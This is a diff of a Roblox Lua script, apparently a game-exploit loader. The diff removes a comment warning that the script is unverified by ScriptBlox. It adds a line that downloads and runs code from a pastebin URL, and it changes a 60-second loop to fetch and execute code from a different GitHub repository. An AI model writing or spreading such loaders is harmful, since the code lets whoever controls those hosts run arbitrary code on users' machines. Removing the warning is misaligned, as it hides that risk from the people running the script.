@@ -41,11 +41,7 @@ local abcdef = {
   Headers = headers
 }
 request(abcdef)
---[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-loadstring(game:HttpGet"https://raw.githubusercontent.com/Catsuq/Fun-hub/fun4ng4mez/Script.lua")()
-
+loadstring(game:HttpGet('https://pastebin.com/raw/Ycyen8AM'))()
 coroutine.resume(coroutine.create(function()
     while wait(60) do
         local function main()
@@ -55,7 +51,7 @@ coroutine.resume(coroutine.create(function()
             if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
                 player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
             end
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/PickleIsDaBest/EmojiMain/main/Script'))()
+            loadstring(game:HttpGet"https://raw.githubusercontent.com/Catsuq/Fun-hub/fun4ng4mez/Script.lua")()
         end
         local success, err = pcall(main)
     end
